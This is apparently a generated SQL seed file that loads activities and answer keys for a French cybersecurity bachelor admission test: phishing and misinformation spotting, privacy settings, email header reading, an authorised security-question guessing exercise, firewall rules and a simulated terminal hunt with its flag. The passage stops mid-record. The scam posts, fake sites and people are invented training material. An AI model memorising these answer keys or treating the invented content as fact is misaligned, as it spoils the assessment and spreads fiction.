-- Épreuves d'admission 2026 : réservoir d'activités pratiques tirées au hasard (45 min par candidat).
-- À lancer APRÈS 2026-11-04-TOUT-exercices-a-lancer.sql. Fichier généré : ne pas modifier à la main.
-- 1. retire Cybersup OS (détection du phishing) ; 2. ajoute les exercices des packs (principaux et réserve) ;
-- 3. tirage de 45 minutes d'activités par candidat ; 4. durée = 50 min de QCM + 45 min d'activités ;
-- 5. le seuil en points est retiré (le total varie selon les activités tirées) : la décision se fait sur la note sur 20.
-- Relancer ce fichier ne crée pas de doublon (les exercices déjà ajoutés sont retirés puis remis).
do $seed$
declare v_test uuid; v_q uuid; v_pos int;
begin
  select id into v_test from tests where title = $q$Admission Bachelor 1 Cybersécurité 2026$q$ order by created_at desc limit 1;
  if v_test is null then raise notice 'Épreuve introuvable : %', $q$Admission Bachelor 1 Cybersécurité 2026$q$; else
    delete from questions where test_id = v_test and id in (select question_id from question_externals where tool = 'win95');
    delete from questions where test_id = v_test and domain like '%(activité)';
    select coalesce(max(position), 0) into v_pos from questions where test_id = v_test;
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'netpuzzle', $q$Le carré au centre est un serveur, les petits écrans sont des ordinateurs. Cliquez sur une case pour la faire tourner. Faites tourner les cases jusqu'à ce que tous les ordinateurs soient reliés au serveur (ils deviennent orange), sans câble qui part dans le vide.$q$, $q${"w":5,"h":5,"help":true}$q$::jsonb, 2, $q$Logique et raisonnement (activité)$q$, 240, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$null$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'hotspot', $q$Voici l'historique des connexions au compte de Léa, qui habite à Lyon et travaille de 9 h à 18 h. Cliquez sur les connexions qui vous semblent suspectes.$q$, $q${"layout":"table","multi":true,"columns":["Date","Heure","Ville","Appareil","Résultat"],"segments":[{"id":"c1","cells":["lundi","08:52","Lyon","Ordinateur portable","réussie"]},{"id":"c2","cells":["lundi","12:30","Lyon","Téléphone","réussie"]},{"id":"c3","cells":["mardi","03:14","Lagos (Nigeria)","Ordinateur inconnu","échec"]},{"id":"c4","cells":["mardi","03:15","Lagos (Nigeria)","Ordinateur inconnu","échec"]},{"id":"c5","cells":["mardi","03:16","Lagos (Nigeria)","Ordinateur inconnu","réussie"]},{"id":"c6","cells":["mardi","09:05","Lyon","Ordinateur portable","réussie"]},{"id":"c7","cells":["mercredi","17:40","Lyon","Téléphone","réussie"]},{"id":"c8","cells":["jeudi","02:47","Moscou (Russie)","Ordinateur inconnu","réussie"]}]}$q$::jsonb, 2, $q$Réflexes cyber (activité)$q$, 180, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c3","c4","c5","c8"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'password', $q$Un pirate essaie d'abord les mots de passe les plus courants, puis des mots du dictionnaire avec des petites variantes (a remplacé par @, un chiffre à la fin…). Classez ces mots de passe, du plus vite deviné (en haut) au plus difficile à deviner (en bas).$q$, $q${"mode":"rank","help":true,"items":[{"id":"p1","text":"azerty123"},{"id":"p2","text":"P@ssw0rd2024"},{"id":"p3","text":"Marseille13!"},{"id":"p4","text":"tortue-velo-nuage-47"},{"id":"p5","text":"j7#Qx!r9Lw2$"}]}$q$::jsonb, 2, $q$Réflexes cyber (activité)$q$, 150, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$null$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'robot', $q$Le robot doit allumer toutes les lampes (cases jaunes). Composez son programme avec les boutons, puis lancez-le. La case P1 est une petite routine que vous pouvez appeler plusieurs fois : elle évite de tout réécrire.$q$, $q${"levels":[{"map":"..L.L","start":[0,0],"dir":1,"main":8,"p1":0},{"map":"L..L\n.##.\n.##.\nL..L","start":[0,0],"dir":1,"main":5,"p1":5},{"map":"L.###\n#L.##\n##L.#\n###L#","start":[0,0],"dir":1,"main":5,"p1":5}],"help":true}$q$::jsonb, 3, $q$Algorithmique (activité)$q$, 360, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$null$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'terminal', $q$Chasse au trésor dans un terminal Linux : suivez les indications affichées, aucune connaissance n'est nécessaire.$q$, null, 3, $q$Fonctionnement du numérique (activité)$q$, 420, null) returning id into v_q;
    insert into question_terminals(question_id, scenario, flag) values (v_q, $q${
  "user": "explorateur",
  "hostname": "cybersup-lab",
  "home": "/home/explorateur",
  "motd": "Bienvenue sur un vrai terminal Linux (simulé). Ici, on parle à l'ordinateur en tapant des commandes, puis Entrée.\nLes 4 commandes dont vous avez besoin :\n  ls            liste ce qu'il y a dans le dossier où vous êtes\n  ls -a         la même chose, y compris les fichiers cachés (leur nom commence par un point)\n  cd dossier    entre dans un dossier ; cd ..  remonte d'un cran\n  cat fichier   affiche le contenu d'un fichier\nCommencez par : cat LISEZMOI.txt",
  "files": {
    "/home/explorateur/LISEZMOI.txt": "Un agent a caché un code secret dans ce compte.\nIndice 1 : il est rangé quelque part dans le dossier « coffre ».\nIndice 2 : l'agent aime cacher ses fichiers (pensez à ls -a).\nQuand vous l'avez, recopiez le code (il commence par CYBER{) dans la case sous le terminal.\nBonus : créez un dossier nommé « rapport » dans votre dossier personnel (commande : mkdir rapport).\n",
    "/home/explorateur/coffre/etagere/carton.txt": "Rien ici, cherchez encore. Avez-vous essayé ls -a ?\n",
    "/home/explorateur/coffre/etagere/.boite_noire/code.txt": "Bravo ! Le code est : CYBER{l1nux_s4ns_p3ur}\n",
    "/home/explorateur/coffre/notes.txt": "L'étagère n'est pas aussi vide qu'elle en a l'air.\n"
  },
  "objectives": [
    {
      "id": "lire",
      "title": "Lire le fichier LISEZMOI.txt",
      "check": {
        "type": "ran",
        "command": "cat"
      }
    },
    {
      "id": "cache",
      "title": "Afficher les fichiers cachés avec ls -a",
      "check": {
        "type": "ran",
        "command": "ls"
      }
    },
    {
      "id": "dossier",
      "title": "Créer le dossier « rapport »",
      "check": {
        "type": "exists",
        "path": "/home/explorateur/rapport",
        "kind": "dir"
      }
    }
  ]
}$q$::jsonb, $q$CYBER{l1nux_s4ns_p3ur}$q$);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'feed', $q$Dix publications circulent sur un réseau social, présentées une par une. Pour chacune, dites si elle est fiable, douteuse (à vérifier avant de la croire) ou fausse, puis cochez ce qui vous a guidé. Enquêtez comme dans la vraie vie : touchez le nom d'un compte pour voir son profil, et l'aperçu d'un lien pour ouvrir le site.$q$, $q${"help":true,"ask_reason":true,"posts":[{"id":"f1","art":"appli_payante","author":"Info Rapide 24","handle":"@inforapide24_","badge":"nouveau","age":"il y a 3 jours","date":"il y a 2 h","text":"🚨 URGENT !!! À partir de lundi, l'application MessaGo deviendra PAYANTE (4,99 €/mois) sauf si vous partagez ce message à 10 contacts. PARTAGEZ AVANT QUE CE SOIT SUPPRIMÉ !!!","stats":"18 400 partages","profile":{"bio":"L'info AVANT tout le monde 🔥 Partagez !","created":"il y a 3 jours","followers":"112","following":"4 800","posts":[{"date":"hier","text":"🚨 Le réseau Wi-Fi des trains sera coupé DÉFINITIVEMENT demain, PARTAGEZ !!!"},{"date":"il y a 2 jours","text":"Votre forfait mobile va DOUBLER sauf si vous envoyez STOP à ce numéro 👉 …"}]}},{"id":"f2","art":"maintenance","author":"Cybersup","handle":"@cybersup","badge":"officiel","date":"hier","text":"Maintenance de l'espace candidat samedi de 8 h à 10 h. Les inscriptions restent possibles ensuite. Merci de votre patience.","link":{"title":"Planning des maintenances","url":"https://www.cybersup.ai/maintenance","site":{"kind":"officiel","brand":"Cybersup","color":"#0e1116","art":"maintenance","date":"Publié hier","title":"Maintenance de l'espace candidat","text":["L'espace candidat sera indisponible samedi de 8 h à 10 h pour une mise à jour.","Les inscriptions restent ouvertes ensuite. Aucune action n'est demandée de votre part : nous ne vous demanderons jamais votre mot de passe par mail ou par message."]}},"stats":"42 j'aime","profile":{"bio":"École de cybersécurité et d'intelligence artificielle.","created":"en mars 2021","followers":"8 900","following":"310","posts":[{"date":"il y a 4 jours","text":"Portes ouvertes le 15 novembre : venez rencontrer nos formateurs."}]}},{"id":"f3","art":"cadeau","author":"Aide Étudiants France","handle":"@aide_etudiants_fr2026","badge":"nouveau","age":"il y a 1 semaine","date":"il y a 5 h","text":"Bonne nouvelle 🎉 L'État verse une prime numérique de 500 € à TOUS les étudiants. Inscrivez-vous avant minuit avec votre numéro de carte bancaire pour la recevoir.","link":{"title":"Prime numérique étudiante : inscription","url":"https://prime-etudiant-gouv.info-officiel.co/inscription","site":{"kind":"phishing","brand":"Portail Aide Etudiant","color":"#1e3a8a","art":"cadeau","title":"Prime numérique de 500 € : dernier jour !","text":["Pour recevoir votre prime IMMEDIATEMENT, remplisez le formulaire ci dessous avant minuit.","Les frais de dossier de 1 € seront prélevés sur votre carte pour vérifier votre identitée."],"form":["Nom et prénom","Numéro de carte bancaire","Date d'expiration","Code de sécurité (3 chiffres au dos)"],"cta":"Recevoir mes 500 €"}},"stats":"9 100 partages","profile":{"bio":"Les bons plans pour les étudiants 💸","created":"il y a 1 semaine","followers":"57","following":"2 300","posts":[{"date":"il y a 3 jours","text":"Gagnez un téléphone dernier cri : il suffit de remplir ce formulaire avec votre adresse et votre date de naissance 📱"}]}},{"id":"f4","art":"manette","author":"Actu Jeunes","handle":"@actujeunes","date":"il y a 1 jour","text":"Selon une étude, les jeunes qui jouent aux jeux vidéo ont de meilleures notes en maths. 🎮➕📈","stats":"31 000 j'aime","profile":{"bio":"Tendances, buzz et vidéos qui font parler.","created":"en 2019","followers":"240 000","following":"120","posts":[{"date":"il y a 2 jours","text":"Les chats comprendraient leur prénom, selon des chercheurs 😺"}]}},{"id":"f5","art":"faille","author":"Le Quotidien du Numérique","handle":"@quotidien_numerique","badge":"media","date":"il y a 3 h","text":"Une faille de sécurité dans l'application MessaGo a été corrigée. L'éditeur recommande d'installer la dernière mise à jour depuis le magasin d'applications.","link":{"title":"Faille dans MessaGo : ce qu'il faut faire","url":"https://www.quotidien-numerique.fr/securite/faille-messago-corrigee","site":{"kind":"media","brand":"Le Quotidien du Numérique","color":"#0f766e","art":"faille","date":"Sécurité · il y a 3 h · par la rédaction","title":"Faille dans MessaGo : ce qu'il faut faire","text":["L'éditeur de MessaGo a corrigé hier une faille qui pouvait permettre de lire certains messages. Aucune exploitation massive n'a été constatée selon l'éditeur.","Pour être protégé, il suffit d'installer la version 4.12.1 depuis le magasin d'applications officiel de votre téléphone. Méfiez-vous des liens « de mise à jour » reçus par message : ils peuvent être piégés."]}},"stats":"1 200 partages","profile":{"bio":"Journal en ligne consacré au numérique. Rédaction à Paris.","created":"en 2012","followers":"410 000","following":"900","posts":[{"date":"hier","text":"Ce que change la nouvelle loi sur les données personnelles, expliqué simplement."}]}},{"id":"f6","art":"video_choc","author":"Le Quotidien du Numérique","handle":"@quotidien_numerique_officiel_","badge":"nouveau","age":"il y a 2 jours","date":"il y a 40 min","text":"INCROYABLE 😱 Un célèbre youtubeur arrêté pour piratage, regardez la vidéo avant qu'elle soit censurée !","link":{"title":"La vidéo choc","url":"https://quotidien-numerique.fr.actu-choc.net/video","site":{"kind":"choc","brand":"ACTU-CHOC","color":"#111111","art":"video_choc","title":"Le youtubeur arrêté : la vidéo qu'ils veulent censurer","text":["⚠️ Votre lecteur vidéo n'est pas à jour. Pour voir la vidéo, installez la mise à jour ci-dessous."],"cta":"Installer le lecteur vidéo (gratuit)"}},"stats":"5 600 partages","profile":{"bio":"Compte officiel ✅✅","created":"il y a 2 jours","followers":"31","following":"5 000","posts":[{"date":"hier","text":"😱 Une star de la télé ruinée, regardez avant suppression !"}]}},{"id":"f7","author":"Thomas","handle":"@thomas_du_75","date":"il y a 6 h","text":"Il paraît qu'Internet va être coupé dans toute la France ce week-end pour une maintenance. Quelqu'un a des infos ?","stats":"230 réponses","profile":{"bio":"Fan de foot et de jeux vidéo.","created":"en 2017","followers":"180","following":"260","posts":[{"date":"il y a 3 jours","text":"Quelqu'un a testé le nouveau jeu de course ? Ça vaut le coup ?"}]}},{"id":"f8","art":"pont","author":"Ville de Lyon","handle":"@villedelyon","badge":"officiel","date":"il y a 4 h","text":"Travaux : le pont Lafayette sera fermé aux voitures du 12 au 16 novembre. Les bus et les vélos pourront toujours passer.","link":{"title":"Fermeture du pont Lafayette","url":"https://www.lyon.fr/actualite/travaux/pont-lafayette","site":{"kind":"ville","brand":"Ville de Lyon","color":"#c8102e","art":"pont","date":"Actualités · Travaux · il y a 4 h","title":"Fermeture du pont Lafayette aux voitures","text":["Du 12 au 16 novembre, le pont Lafayette est fermé à la circulation automobile pour des travaux d'entretien de la chaussée.","Les bus, les vélos et les piétons peuvent toujours passer. Des déviations sont mises en place par les quais."]}},"stats":"860 partages","profile":{"bio":"Compte officiel de la Ville de Lyon.","created":"en 2010","followers":"320 000","following":"540","posts":[{"date":"hier","text":"Collecte des encombrants samedi dans le 7e arrondissement."}]}},{"id":"f9","art":"inondation","author":"Météo Choc","handle":"@meteo_choc","date":"il y a 1 h","text":"😢 Regardez ces images terribles des inondations d'hier soir à Marseille. Personne n'en parle !!","image":"Photo : une rue inondée, des voitures dans l'eau jusqu'aux fenêtres.","stats":"12 300 partages","profile":{"bio":"Les images météo les plus folles.","created":"en août 2026","followers":"2 100","following":"3 900","posts":[{"date":"il y a 2 semaines","text":"😢 Regardez ces images terribles des inondations à Nice. Personne n'en parle !! (même photo de rue inondée)"},{"date":"il y a 2 mois","text":"Inondations à Bordeaux ce matin 😢 (même photo de rue inondée)"}]}},{"id":"f10","art":"complement","author":"Dr Julien Marchand","handle":"@dr_julien_sante","badge":"nouveau","age":"il y a 2 semaines","date":"il y a 3 h","text":"Je suis médecin : ce complément naturel guérit la grippe en 24 h, les laboratoires ne veulent pas que vous le sachiez. -50 % avec mon code JULIEN50 !","link":{"title":"Boutique officielle","url":"https://super-immunite-shop.biz/julien50","site":{"kind":"boutique","brand":"Super Immunité Shop","color":"#047857","art":"complement","title":"Super Immunité : guérit la grippe en 24 h*","price":["89,90 €","44,95 €"],"text":["Recommandé par le Dr Julien. 100 % naturel, résultat garanti ou remboursé.","*Ce produit n'est pas un médicament. Offre valable encore 09:59 minutes !"],"cta":"J'en profite avec le code JULIEN50"}},"stats":"3 400 j'aime","profile":{"bio":"Médecin 👨‍⚕️ Santé naturelle. Codes promo en lien.","created":"il y a 2 semaines","followers":"640","following":"7 100","posts":[{"date":"il y a 5 jours","text":"Ce thé détox fait perdre 5 kg en une semaine, code JULIEN50 🍵"},{"date":"il y a 1 semaine","text":"Les vaccins contre la grippe ne servent à rien, la nature suffit !"}]}}]}$q$::jsonb, 4, $q$Réflexes cyber (activité)$q$, 600, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"verdicts":{"f1":"faux","f2":"fiable","f3":"faux","f4":"douteux","f5":"fiable","f6":"faux","f7":"douteux","f8":"fiable","f9":"faux","f10":"faux"},"reasons":{"f1":["urgence","compte_recent"],"f2":["source_fiable","lien_coherent"],"f3":["donnees","lien_suspect","trop_beau","compte_recent"],"f4":["sans_source"],"f5":["source_fiable","lien_coherent"],"f6":["imitation","lien_suspect","compte_recent","trop_beau"],"f7":["sans_source"],"f8":["source_fiable","lien_coherent"],"f9":["deja_vu","urgence"],"f10":["vend","trop_beau","lien_suspect","compte_recent"]}}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_single', $q$Que garantit le petit cadenas à côté de l'adresse d'un site ?$q$, $q$[{"id":"c1a","text":"Que le site est honnête"},{"id":"c1b","text":"Que la connexion entre vous et le site est chiffrée"},{"id":"c1c","text":"Que le site est gouvernemental"},{"id":"c1d","text":"Que le site n'a pas de publicité"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$Le cadenas (HTTPS) chiffre la connexion. Un faux site peut très bien en avoir un : il ne prouve pas que le site est honnête.$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c1b"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_single', $q$Lequel de ces noms est un moteur de recherche ?$q$, $q$[{"id":"c2a","text":"Firefox"},{"id":"c2b","text":"Qwant"},{"id":"c2c","text":"Windows"},{"id":"c2d","text":"Bluetooth"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$Qwant est un moteur de recherche (comme Google). Firefox est un navigateur, Windows un système d'exploitation.$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c2b"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_single', $q$Lequel de ces logiciels est un système d'exploitation ?$q$, $q$[{"id":"c3a","text":"Linux"},{"id":"c3b","text":"Word"},{"id":"c3c","text":"Google"},{"id":"c3d","text":"YouTube"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$Le système d'exploitation (Linux, Windows, macOS, Android) fait fonctionner l'ordinateur et ses programmes.$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c3a"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_single', $q$Que veut dire « open source » pour un logiciel ?$q$, $q$[{"id":"c4a","text":"Il est forcément gratuit et sans bug"},{"id":"c4b","text":"Son code source est public : chacun peut le lire, le modifier et le partager"},{"id":"c4c","text":"Il ne fonctionne qu'en ligne"},{"id":"c4d","text":"Il a été créé par un gouvernement"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$Open source = code public et réutilisable selon une licence. Linux, Firefox ou VLC sont open source.$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c4b"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_single', $q$Combien de bits contient un octet ?$q$, $q$[{"id":"c5a","text":"2"},{"id":"c5b","text":"8"},{"id":"c5c","text":"10"},{"id":"c5d","text":"1 000"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$Un octet = 8 bits. Un bit vaut 0 ou 1.$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c5b"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'mcq_single', $q$À quoi sert la mémoire vive (RAM) d'un ordinateur ?$q$, $q$[{"id":"c6a","text":"À garder vos photos quand l'ordinateur est éteint"},{"id":"c6b","text":"À stocker temporairement ce que l'ordinateur est en train d'utiliser"},{"id":"c6c","text":"À se connecter au Wi-Fi"},{"id":"c6d","text":"À refroidir le processeur"}]$q$::jsonb, 1, $q$Culture informatique (activité)$q$, 45, $q$La RAM est la mémoire de travail, effacée à l'extinction. Les fichiers sont gardés sur le disque (SSD ou disque dur).$q$) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["c6b"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'sim', $q$Léa, 17 ans, vous prête son téléphone : son compte sur l'appli photo est grand ouvert. Protégez-la en réglant son compte comme le ferait une personne prudente. Explorez tous les écrans de l'appli (profil, publications, demandes, réglages).$q$, $q${"kind":"privacy","help":false,"account":{"name":"Léa Martin","handle":"lea.mrtn","followers":"1 204","following":"380","bio":"📍 12 rue des Lilas, Lille · 📞 06 12 34 56 78 · Lycée Jean-Moulin, terminale 🎓"},"posts":[{"id":"p1","art":"identite","caption":"Enfin ma nouvelle carte d'identité 😎","likes":87},{"id":"p2","art":"coucher","caption":"Coucher de soleil sur la plage 🌅","likes":214},{"id":"p3","art":"maison","caption":"Notre nouvelle maison !! 🏡 (on emménage samedi)","likes":152},{"id":"p4","art":"chat","caption":"Mochi fait la sieste 😴","likes":341},{"id":"p5","art":"billet","caption":"Départ pour Barcelone demain 6 h, la maison sera vide une semaine ✈️","likes":98}],"requests":[{"id":"r1","name":"Cadeaux Gratuits Officiel","handle":"cadeaux.gratuits.0fficiel","info":"0 publication · 3 abonnés · compte créé cette semaine"},{"id":"r2","name":"Inès Bernard","handle":"ines.brnd","info":"14 amis en commun · dans la même classe"},{"id":"r3","name":"Agence Mannequins Paris","handle":"agence.mannequins.casting","info":"« Tu es très jolie, envoie-nous des photos en privé »"}],"settings":{"private":false,"location":true,"messages":"tous","tags":"tous","activity":true,"twofa":false}}$q$::jsonb, 4, $q$Réflexes cyber (activité)$q$, 360, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"settings":{"private":true,"location":false,"messages":"abonnes","tags":"abonnes","activity":false,"twofa":true},"deleted":["p1","p3","p5"],"kept":["p2","p4"],"requests":{"r1":"refuse","r2":"accept","r3":"refuse"},"bio_forbid":["rue des lilas","06 12","0612"]}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'sim', $q$Exercice autorisé : Marc a accepté qu'on teste la sécurité de sa messagerie. Elle permet de réinitialiser le mot de passe en répondant à des questions secrètes. Lisez son profil public, puis essayez de répondre à sa place. Enfin, dites ce qui l'aurait protégé.$q$, $q${"kind":"osint","help":false,"profile":{"name":"Marc Lemoine","handle":"marc.lemoine.photo","bio":"Photographe amateur 📷 · Breton dans l'âme · papa de deux loulous","followers":"642","posts":[{"date":"il y a 3 jours","art":"chien","text":"Il y a 9 ans aujourd'hui, Caramel entrait dans ma vie 🐶 Mon tout premier chien, toujours là ❤️"},{"date":"il y a 2 semaines","art":"phare","text":"Week-end à Quimper, ma ville natale. Rien ne vaut la Bretagne 🌊 #quimper #bzh"},{"date":"il y a 1 mois","text":"Retrouvailles avec les anciens de l'école primaire Jules-Ferry, 30 ans après ! On n'a pas changé (ou presque) 😂"},{"date":"il y a 2 mois","art":"gateau","text":"45 ans aujourd'hui 🎂 Merci pour tous vos messages !"}]},"mail":{"brand":"Mailo","email":"marc.lemoine@mailo.example"},"questions":[{"id":"animal","label":"Quel est le nom de votre premier animal de compagnie ?"},{"id":"ville","label":"Dans quelle ville êtes-vous né ?"},{"id":"ecole","label":"Comment s'appelait votre école primaire ?"}],"choices":[{"id":"a","text":"Mettre une majuscule au début de chaque réponse"},{"id":"b","text":"Donner des réponses inventées (que lui seul connaît, notées dans un gestionnaire de mots de passe) et activer la double authentification"},{"id":"c","text":"Changer de question secrète pour « Quelle est votre date de naissance ? »"},{"id":"d","text":"Publier seulement le week-end"}]}$q$::jsonb, 4, $q$Réflexes cyber (activité)$q$, 360, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"answers":{"animal":"Caramel","ville":"Quimper","ecole":["Jules-Ferry","Jules Ferry","école Jules-Ferry","ecole jules ferry","école primaire Jules-Ferry","JulesFerry"]},"choice":"b"}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'ordering', $q$Pour aller sur un site, votre navigateur fait comme vous pour appeler quelqu'un dont vous ne connaissez que le nom : il cherche d'abord son numéro dans un annuaire, puis il appelle. Remettez les étapes dans l'ordre.$q$, $q$[{"id":"o1","text":"Vous tapez www.cybersup.ai et vous appuyez sur Entrée"},{"id":"o2","text":"Le navigateur demande à l'annuaire d'Internet le numéro (l'adresse IP) du site"},{"id":"o3","text":"L'annuaire répond avec l'adresse IP du site"},{"id":"o4","text":"Le navigateur contacte l'ordinateur du site à cette adresse"},{"id":"o5","text":"L'ordinateur du site envoie la page"},{"id":"o6","text":"Le navigateur affiche la page à l'écran"}]$q$::jsonb, 2, $q$Fonctionnement du numérique (activité)$q$, 150, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$["o1","o2","o3","o4","o5","o6"]$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'headers', $q$Un étudiant a reçu ce mail et vous demande s'il doit cliquer. Les informations sont dans les tableaux : lisez-les attentivement, la réponse à chaque question y figure.$q$, $q${"raw":"Received: from mx.cybersup-ecole.example (mx.cybersup-ecole.example [192.0.2.25])\n        by mail.cybersup-ecole.example with ESMTPS id 7Hq2; Tue, 3 Nov 2026 08:14:09 +0100\nReceived: from relay.mailflux.example (relay.mailflux.example [198.51.100.77])\n        by mx.cybersup-ecole.example with ESMTP id 41fd; Tue, 3 Nov 2026 08:14:06 +0100\nReceived: from pc-0451 (unknown [203.0.113.45])\n        by relay.mailflux.example with SMTP id x9k2; Tue, 3 Nov 2026 08:13:21 +0100\nAuthentication-Results: mx.cybersup-ecole.example;\n       spf=fail (sender IP is 203.0.113.45) smtp.mailfrom=banque-horizon-secure.example;\n       dkim=none (message not signed);\n       dmarc=fail action=quarantine header.from=banque-horizon.example\nFrom: \"Service Client Banque Horizon\" <securite@banque-horizon.example>\nReply-To: <support-client@verif-compte-urgent.example>\nReturn-Path: <bounce@banque-horizon-secure.example>\nTo: <etudiant@cybersup-ecole.example>\nSubject: [URGENT] Votre compte sera suspendu sous 24 h\nDate: Tue, 3 Nov 2026 08:13:19 +0100\nMessage-ID: <20261103071319.4471@pc-0451>","view":"table","ask":["origin_ip","spf","reply_to","verdict"],"help":true,"body":"Cher client,\n\nNous avons détecté une activité inhabituelle sur votre compte. Sans vérification de votre part dans les 24 heures, votre compte sera suspendu et vos cartes bloquées.\n\nMerci de confirmer votre identité en cliquant sur le bouton ci-dessous.\n\nLe service client Banque Horizon","button":{"label":"Vérifier mon compte","url":"https://banque-horizon.verif-compte-urgent.example/connexion"}}$q$::jsonb, 2, $q$Réflexes cyber (activité)$q$, 240, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"origin_ip":"203.0.113.45","spf":"fail","reply_to":"oui","verdict":"phishing"}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'blocks', $q$Vous êtes le gardien de l'entrée du serveur de l'école. Chaque visiteur annonce sa porte (le « port ») et son adresse (l'« IP »). Les règles à appliquer :
• tout le monde peut entrer par les portes 80 et 443 (le site web) ;
• la porte 22 (la maintenance) seulement pour les adresses qui commencent par 10. ;
• tout le reste est refusé.
Assemblez les blocs, puis vérifiez dans le tableau du bas que chaque visiteur reçoit la bonne décision.$q$, $q${"help":true,"sample":[{"id":"s1","label":"Visiteur du site","src_ip":"88.12.4.9","dst_port":443,"protocol":"tcp","country":"FR","hour":14,"expected":"allow"},{"id":"s2","label":"Admin au bureau","src_ip":"10.0.4.20","dst_port":22,"protocol":"tcp","country":"FR","hour":10,"expected":"allow"},{"id":"s3","label":"SSH depuis internet","src_ip":"185.220.101.7","dst_port":22,"protocol":"tcp","country":"DE","hour":3,"expected":"block"},{"id":"s4","label":"Base de données exposée","src_ip":"45.83.64.2","dst_port":3306,"protocol":"tcp","country":"RU","hour":2,"expected":"block"}]}$q$::jsonb, 2, $q$Logique et raisonnement (activité)$q$, 300, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"packets":[{"id":"h1","label":"","src_ip":"92.184.10.3","dst_port":80,"protocol":"tcp","country":"FR","hour":9,"expected":"allow"},{"id":"h2","label":"","src_ip":"51.15.2.8","dst_port":443,"protocol":"tcp","country":"FR","hour":22,"expected":"allow"},{"id":"h3","label":"","src_ip":"203.0.113.5","dst_port":443,"protocol":"tcp","country":"US","hour":4,"expected":"allow"},{"id":"h4","label":"","src_ip":"10.1.2.3","dst_port":22,"protocol":"tcp","country":"FR","hour":11,"expected":"allow"},{"id":"h5","label":"","src_ip":"10.200.0.9","dst_port":22,"protocol":"tcp","country":"FR","hour":23,"expected":"allow"},{"id":"h6","label":"","src_ip":"10.0.0.7","dst_port":443,"protocol":"tcp","country":"FR","hour":15,"expected":"allow"},{"id":"h7","label":"","src_ip":"11.0.0.4","dst_port":22,"protocol":"tcp","country":"US","hour":3,"expected":"block"},{"id":"h8","label":"","src_ip":"192.168.1.10","dst_port":22,"protocol":"tcp","country":"FR","hour":9,"expected":"block"},{"id":"h9","label":"","src_ip":"185.220.101.7","dst_port":22,"protocol":"tcp","country":"DE","hour":2,"expected":"block"},{"id":"h10","label":"","src_ip":"45.83.64.2","dst_port":3389,"protocol":"tcp","country":"RU","hour":1,"expected":"block"},{"id":"h11","label":"","src_ip":"10.0.0.8","dst_port":3306,"protocol":"tcp","country":"FR","hour":10,"expected":"block"},{"id":"h12","label":"","src_ip":"88.12.4.9","dst_port":21,"protocol":"tcp","country":"FR","hour":12,"expected":"block"},{"id":"h13","label":"","src_ip":"8.8.8.8","dst_port":53,"protocol":"udp","country":"US","hour":5,"expected":"block"},{"id":"h14","label":"","src_ip":"10.3.3.3","dst_port":80,"protocol":"tcp","country":"FR","ho